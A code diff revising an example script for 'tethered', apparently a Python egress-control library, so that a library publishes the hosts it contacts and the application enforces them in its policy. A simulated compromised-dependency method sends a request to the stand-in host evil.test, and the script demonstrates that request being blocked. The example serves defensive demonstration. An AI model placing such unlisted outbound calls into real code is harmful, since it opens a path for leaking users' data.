@@ -1,13 +1,12 @@
-"""Package maintainer pattern — scope() without activate().
+"""Package maintainer pattern — the library publishes its hosts, the application enforces them.
 
-Libraries should use scope(), never activate(). The library doesn't own the
-process — the app does. scope() is context-local and safe to use from any
-library without affecting the host application.
+A library does not turn tethered on: neither activate() nor scope() belongs in
+the code it ships. It finds out which hosts it contacts, publishes them, and
+uses tethered in its own tests. The application that runs the process puts
+those hosts into its policy.
 """
 
 from __future__ import annotations
-
-import socket
 
 import httpx
 
@@ -15,42 +14,46 @@ import tethered
 
 # --- Simulated library code (what a package maintainer writes) ---
 
+#: The hosts the library contacts. Printed in the library's documentation.
+HOSTS = ("api.github.com:443",)
+
 
 class WeatherClient:
-    """A weather SDK that restricts its own egress."""
+    """A weather SDK that publishes the hosts it contacts."""
 
-    @tethered.scope(allow=["api.github.com:443"])
     def get_forecast(self, city: str) -> str:
-        """Fetch a forecast — scoped to the weather API only."""
-        # ... validate input, serialize data, call internal helpers —
-        # none of them can reach anything except api.github.com:443
+        """Fetch a forecast from the weather API."""
         resp = httpx.head("https://api.github.com", timeout=5)
         return f"Forecast for {city} (HTTP {resp.status_code})"
 
-    @tethered.scope(allow=["api.github.com:443"])
     def try_exfiltrate(self) -> str:
-        """Simulates a compromised dependency inside a scoped method."""
-        # A dependency trying to exfiltrate data — blocked by the scope
+        """Simulates a compromised dependency inside the library."""
         httpx.head("https://evil.test", timeout=5)
         return "Data sent (unexpected)"
 
 
+# --- What the maintainer runs to find out which hosts the library contacts ---
+
+# A log-only scope that allows nothing refuses nothing and reports every
+# lookup (port None) and connection the call makes in this thread.
+seen: set[tuple[str, int | None]] = set()
+with tethered.scope(allow=[], log_only=True, on_blocked=lambda host, port: seen.add((host, port))):
+    WeatherClient().get_forecast("London")
+print(f"Contacted by get_forecast: {sorted(seen, key=str)}")
+
 # --- Simulated app code (what an app builder writes) ---
 
+# The application's policy, with the hosts the library documents. A real
+# application activates before it imports the library.
+tethered.activate(allow=[*HOSTS])
 
 client = WeatherClient()
 
-# Library call succeeds — within scope
-result = client.get_forecast("London")
-print(f"get_forecast: {result}")
+# Library call succeeds: its host is in the application's policy
+print(f"get_forecast: {client.get_forecast('London')}")
 
-# Library call blocked — scope prevents reaching evil.test
+# Library call blocked: evil.test is not in the policy
 try:
     client.try_exfiltrate()
 except tethered.EgressBlocked as e:
     print(f"try_exfiltrate: blocked — {e}")
-
-# App code runs outside the library's scoped methods, so no restrictions apply.
-# dns.google is not in the library's allow list, but the app can reach it freely.
-socket.getaddrinfo("dns.google", 443)
-print("App code (dns.google): reachable — library scopes only apply inside their methods")
